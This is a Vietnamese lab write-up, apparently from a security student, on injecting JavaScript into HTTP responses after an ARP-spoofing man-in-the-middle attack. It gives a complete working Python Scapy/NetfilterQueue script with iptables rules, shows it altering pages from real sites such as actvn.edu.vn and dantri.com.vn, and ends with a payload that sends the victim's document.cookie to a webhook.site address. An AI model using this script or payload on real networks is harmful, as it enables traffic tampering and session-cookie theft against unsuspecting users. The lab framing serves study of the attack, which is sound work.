# Inject Code into HTTP Responses in the Network

sau khi các gói tin trên mạng từ victim phải chuyển qua cho attack để lưu thông trên mạng, chúng ta đã thực hiện được MITM ở bài Lab trước <a href="https://hackmd.io/@monstercuong7/r1R_91mC6">tại đây</a>

- chúng ta sẽ tìm hiểu cách sửa đổi các packets đó để khi victim vào các trang web sẽ bị inject mã javascript (hoặc thậm chí HTML và CSS) vào các phản hồi HTTP trong mạng bằng thư viện Scapy trong Python.

## Tiến hành khai thác Lab

- Kịch bản tấn công:

  - Triển khai giả mạo ARP trong mạng của mục tiêu để tất cả các gói sẽ được định tuyến qua thiết bị của attacker.
  - Tạo quy tắc chuỗi Iptable để đẩy các gói được định tuyến qua thiết bị tới Hàng đợi Netfilter.
  - Bước tiếp theo là xử lý các gói bằng tập lệnh
  - Các gói tin đã được xử lý sẽ được gửi đến nạn nhân.
  - Sau đó, nạn nhân sẽ nhận được chuỗi alert trong đoạn code javascript mà chúng ta chèn vào

- kiểm tra ip trên máy victim

![ảnh](https://hackmd.io/_uploads/SJrXpkDCT.png)

- kiểm tra ip trên máy attacker

![ảnh](https://hackmd.io/_uploads/BJHv61vA6.png)

xem bảng ARP mình được

![ảnh](https://hackmd.io/_uploads/By3Q1gvA6.png)

- vậy mình được ánh xạ địa chỉ mình dùng trong lab này là:

| Host                    | IP address       | MAC address         |
| ----------------------- | ---------------- | ------------------- |
| `Kali linux` (Attacker) | `192.176.45.101` | `34:6f:24:18:c9:2f` |
| `Window 7` (Victim)     | `192.176.45.102` | `0c:84:dc:f5:3c:79` |
| `Default Gateway`       | `192.176.45.1`   | `c0:61:18:e2:ef:72` |

kiểm tra firewal trên máy attacker bằng lệnh

```bash
iptables -L -v
```

mình thấy được không có rule nào được set

- vậy sau khi thiết lập rule bằng code python chúng ta có thể xóa toàn bộ bằng lệnh `iptables --flush`

![ảnh](https://hackmd.io/_uploads/ryG9pJvCp.png)

bậy giờ chúng ta sẽ xây dựng đoạn script để sửa đổi gói tin HTTP khi các packets từ victim đến được card mạng của attacker và mình cần dùng:

- NetfilterQueue: NetfilterQueue là thư viện Python cung cấp quyền truy cập vào các gói khớp với quy tắc iptables trong Linux. Các gói phù hợp có thể được chấp nhận, loại bỏ, thay đổi hoặc đánh dấu.
- iptable (xem thêm về iptable <a href="https://wiki.matbao.net/kb/bao-mat-may-chu-linux-huong-dan-cau-hinh-iptables-can-ban/#2-tao-rule-iptables">tại đây</a>) có 3 chain:
  - **Forward chain** : lọc gói khi đi đến các server khác.
  - **Input chain** : lọc gói khi đi vào trong server.
  - **Output chain** : lọc gói khi ra khỏi server.

### Khai thác tại local

- mình dùng câu lệnh trong iptables là

```bash
iptables -A INPUT -j NFQUEUE --queue-num 0
```

để lọc các gói khi đi vào trong máy tính attacker và chúng ta sẽ khai thác trên máy local của attacker và được đoạn code sau:

```python
from scapy.all import *
from colorama import init, Fore
from netfilterqueue import NetfilterQueue
import re

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RESET = Fore.RESET


def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # raw data cannot be decoded, apparently not HTML
                # forward the packet exit the function
                packet.accept()
                return
            # remove Accept-Encoding header from the HTTP request
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            # set the new data
            spacket[Raw].load = new_load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
        if spacket[TCP].sport == 80:
            # HTTP response
            print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except:
                packet.accept()
                return
            # if you want to debug and see the HTML data
            # print("Load:", load)
            # Javascript code to add, feel free to add any Javascript code
            added_text = "<script>alert('Javascript Injected successfully!');</script>"
            # or you can add HTML as well!
            # added_text = "<p><b>HTML Injected successfully!</b></p>"
            # calculate the length in bytes, each character corresponds to a byte
            added_text_length = len(added_text)
            # replace the </body> tag with the added text plus </body>
            load = load.replace("</body>", added_text + "</body>")
            if "Content-Length" in load:
                # if Content-Length header is available
                # get the old Content-Length value
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                # re-calculate the content length by adding the length of the injected code
                new_content_length = content_length + added_text_length
                # replace the new content length to the header
                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                # print a message if injected
                if added_text in load:
                    print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
            # if you want to debug and see the modified HTML data
            # print("Load:", load)
            # set the new data
            spacket[Raw].load = load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
    # accept all the packets
    packet.accept()


if __name__ == "__main__":
    # initialize the queue
    # queue = netfilterqueue.NetfilterQueue()
    try:
        if os.geteuid() != 0:
            exit("Run with root permission!")
        os.system('iptables -A INPUT -j NFQUEUE --queue-num 0')
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
```

- Chúng ta sẽ sử dụng colorama để in màu .
- đoạn code sẽ:

  - chuyển đổi gói Netfilterqueue của mình thành gói Scapy bằng cách gói gói packet.get_payload()đó IP().
  - Kiểm tra xem gói tin có phải là gói tin TCP và có chứa dữ liệu RAW không
  - Nếu gói tin là một yêu cầu HTTP (cổng 80), nó sẽ loại bỏ header "Accept-Encoding" từ yêu cầu HTTP. Trong yêu cầu HTTP, chúng ta tìm kiếm Accept-Encoding tiêu đề, nếu có thì chúng tôi chỉ cần xóa tiêu đề đó để có thể nhận được phản hồi HTTP dưới dạng mã HTML thô chứ không phải một số loại nén như gzip.
  - Nếu gói tin là một phản hồi HTTP (cổng 80), nó sẽ chèn một đoạn mã Javascript vào phần thân của trang web được trả về trước khi đóng thẻ `</body>`.Bì mọi mã HTML đều có thẻ kèm theo phần thân ( `</body>`), nên chúng ta có thể chỉ cần thay thế thẻ đó bằng mã được chèn (chẳng hạn như JS) và nối thêm phần `</body>`sau vào cuối. Đồng thời, nếu có, nó sẽ cập nhật độ dài của nội dung bằng cách tính toán lại header "Content-Length" bằng hàm `re.sub()`.
  - Chúng ta cũng đặt độ dài của gói IP, tổng kiểm tra của các lớp TCP và IP thành None, do đó Scapy sẽ tự động tính toán lại chúng.
  - Cuối cùng, nó sẽ gửi lại các gói tin đã được sửa đổi. Nếu văn bản đang được tải, chúng tôi sẽ in một thông báo màu xanh lục cho biết chúng tôi đã sửa đổi thành công HTML của phản hồi HTTP.

- mình tạo 1 trang html đơn giản

![ảnh](https://hackmd.io/_uploads/ryY9CQPC6.png)

- sau đó dùng module của python để tạo máy chủ web http chạy ở port 80 trên máy của attacker

```bash
python3 -m http.server  80
```

truy cập thử vào trên trình duyệt sẽ hiện trang html như sau với IP của attacker là 192.176.45.101

![ảnh](https://hackmd.io/_uploads/BkYPC7vCp.png)

- mình chạy file khai thác http_code_injection.py thử curl trang web local vừa tạo

  - thấy đã trigger thành công và chèn được đoạn code javascript vào http response

![ảnh](https://hackmd.io/_uploads/ryJslE_A6.png)

- và khi mình truy cập trang html này trên trình duyệt thấy đã xuất hiện hộp thoại alert

![ảnh](https://hackmd.io/_uploads/SJ2qMG_Ca.png)

- mình thử với trang web trường mình tại actvn.edu.vn cũng thành công inject đoạn code javascript

![ảnh](https://hackmd.io/_uploads/SJ4yzNuA6.png)

- mình thử với dantri.com.vn cũng thành công inject đoạn code javascript

![ảnh](https://hackmd.io/_uploads/S1HFf4_Ra.png)

![ảnh](https://hackmd.io/_uploads/HJTfW4OC6.png)

- riêng với google họ dùng thẻ `<BODY>` có viết hoa nên chúng ta cần thay đổi thẻ này thành chữ in hoa trong script khai thác

![ảnh](https://hackmd.io/_uploads/B1pnGNd0a.png)

- firewall vẫn đang hoạt động nên chưa thể kết thúc request

### Khai thác trên máy victim

- mình sửa câu lệnh trong iptables thành

```bash
iptables -A FORWARD -j NFQUEUE --queue-num 0
```

để lọc các gói khi đi đến các server khác ở đây là máy window 7 của victim và được đoạn code sau:

```python
from scapy.all import *
from colorama import init, Fore
from netfilterqueue import NetfilterQueue
import re

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RESET = Fore.RESET


def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # raw data cannot be decoded, apparently not HTML
                # forward the packet exit the function
                packet.accept()
                return
            # remove Accept-Encoding header from the HTTP request
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            # set the new data
            spacket[Raw].load = new_load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
        if spacket[TCP].sport == 80:
            # HTTP response
            print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except:
                packet.accept()
                return
            # if you want to debug and see the HTML data
            # print("Load:", load)
            # Javascript code to add, feel free to add any Javascript code
            added_text = "<script>alert('Javascript Injected successfully!');</script>"
            # or you can add HTML as well!
            # added_text = "<p><b>HTML Injected successfully!</b></p>"
            # calculate the length in bytes, each character corresponds to a byte
            added_text_length = len(added_text)
            # replace the </body> tag with the added text plus </body>
            load = load.replace("</body>", added_text + "</body>")
            if "Content-Length" in load:
                # if Content-Length header is available
                # get the old Content-Length value
                content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                # re-calculate the content length by adding the length of the injected code
                new_content_length = content_length + added_text_length
                # replace the new content length to the header
                load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                # print a message if injected
                if added_text in load:
                    print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
            # if you want to debug and see the modified HTML data
            # print("Load:", load)
            # set the new data
            spacket[Raw].load = load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
    # accept all the packets
    packet.accept()


if __name__ == "__main__":
    # initialize the queue
    # queue = netfilterqueue.NetfilterQueue()
    try:
        if os.geteuid() != 0:
            exit("Run with root permission!")
        os.system('iptables -A FORWARD -j NFQUEUE --queue-num 0')
        # os.system('iptables -A  FORWARD -j NFQUEUE --queue-num 0')
        queue = NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
```

- chạy lại file arpspoofing để tấn công MITM và sau đó là file http_code_injection.py
- sau đó mình đóng giả làm victim truy cập vào trang web html do attacker tạo ở cùng mạng LAN với victim thì đoạn code lại không thành công

![ảnh](https://hackmd.io/_uploads/BJZWqVdCp.png)

- ở wireshark mình bắt được request này

![ảnh](https://hackmd.io/_uploads/H1JfdmdA6.png)

- chúng ta bắt được các thông báo 200 (khi trang được tải mới) và 304 (khi thông báo không có sự thay đổi của trang web)

![ảnh](https://hackmd.io/_uploads/Hkp7Om_06.png)

![ảnh](https://hackmd.io/_uploads/r1Eid7OCa.png)

- và script khai thác của chúng ta đã nhận diện xử lý gói tin từ máy victim đến máy của chúng ta

![ảnh](https://hackmd.io/_uploads/Sy2CuXu0p.png)

- tuy nhiên khi victim truy cập vào trang web ngoài internet ví dụ trang web của trường mình tại actvn.edu.vn

![ảnh](https://hackmd.io/_uploads/BJXlkE_Ra.png)

- và mình đã trigger thành công!!!!
- CTRL + U để view source code mình thấy đoạn javascript

```javascript
<script>alert('Javascript Injected successfully!');</script>
```

đã được chèn vào HTTP response

![ảnh](https://hackmd.io/_uploads/rkaACX_Ca.png)

- ở phía attacker mình thấy thông báo đã thành công inject code vào máy victim ở đây với IP là 192.176.45.102

![ảnh](https://hackmd.io/_uploads/SkcramOC6.png)

mình xem gói tin bắt được trên wireshark ở máy attacker và thấy gói tin chứa trang login của actvn.edu.vn chưa bị thay đổi

- có thể thấy wireshark bắt các gói tin đầu vào khi chưa qua đoạn code xử lý gói tin của chúng ta

![ảnh](https://hackmd.io/_uploads/Sy7607uRT.png)

- bây giờ bài toán đã trở thành khai thác tương tự như XSS
  - và mình sẽ đánh cắp cookie của nạn nhân với script

```javascript
<script>document.location="https://webhook.site/c7194fa6-1757-4100-92bb-aa8f9c5d91ae?lay_duoc_cookie="+document.cookie;</script>
```

đoạn payload sẽ chuyển hướng trình duyệt đến trang webhook của mình và gửi kèm theo cookie

![ảnh](https://hackmd.io/_uploads/B1n78BOAa.png)

khi victim truy cập qldt.actvn.edu.vn

![ảnh](https://hackmd.io/_uploads/Ska6SruR6.png)

attacker đã nhận được cookie trong parameter `lay_duoc_cookie` mình đặt ở trên và dĩ nhiên mình không đăng nhập trên máy này nên cookie lúc này sẽ rỗng

![ảnh](https://hackmd.io/_uploads/r1qGBS_Cp.png)

## Tham khảo

- https://thepythoncode.com/article/injecting-code-to-html-in-a-network-scapy-python
